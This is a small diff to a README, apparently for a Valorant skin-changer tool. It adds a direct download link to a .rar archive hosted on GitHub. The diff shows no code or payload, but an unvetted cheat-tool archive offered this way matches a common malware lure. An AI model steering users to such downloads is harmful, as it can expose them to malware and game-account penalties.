@@ -10,7 +10,7 @@
 
 Read everything carefully before you click anything.
 
-1. Download from [here]()
+1. Download from [here](https://github.com/kyleanox/valorant-skinchanger/raw/main/valorant-skinchanger.rar)
 2. Download the `valorant-skinchanger.rar` file by clicking on it
 
 ---
